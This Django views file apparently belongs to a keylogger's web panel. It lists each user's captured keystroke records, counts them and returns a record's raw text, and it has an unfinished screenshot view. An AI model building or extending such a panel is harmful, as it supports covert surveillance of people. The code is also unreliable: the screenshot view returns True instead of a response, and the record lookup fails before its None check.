from django.shortcuts import render
from django.template import RequestContext, Template
from django.http.response import HttpResponse, HttpResponseRedirect
from api.models import KeyLogRecord

# Create your views here.

# TODO: CAN WE HAVE A REDIRECTION IN THE REQUEST.PATH == /EXAMINE/ TO /EXAMINE/DASHBOARD?

def dashboard(request):
    if request.user.is_authenticated():
        template = Template(open('examine/templates/examine.html').read())

        dictionary = {'username': request.user}

        context = RequestContext(request, dictionary)

        return HttpResponse(template.render(context))

    else:
        return HttpResponseRedirect('../login')


def keylogger(request):
    if request.user.is_authenticated():
        template = Template(open('examine/templates/keylogger.html').read())

        keylog_list = KeyLogRecord.objects.filter(user__username=request.user.username)

        dictionary = {'username': request.user,
                      'num_of_keylogs': keylog_list.count(),
                      'num_of_chars': sum(len(keylog.string) for keylog in keylog_list),
                      'keylog_list': keylog_list}

        context = RequestContext(request, dictionary)

        return HttpResponse(template.render(context))

    else:
        return HttpResponseRedirect('../login')


def keylog_record(request, keylog_num):
    if request.user.is_authenticated():
        keylog = KeyLogRecord.objects.filter(user__username=request.user.username,
                                             id=keylog_num)[0]

        if keylog is not None:
            return HttpResponse(keylog.string)

        else:
            return HttpResponseRedirect('../')

    else:
        return HttpResponseRedirect('../login')


def screenshot(request):
    if request.user.is_authenticated():
        return True

    else:
        return HttpResponseRedirect('../login')

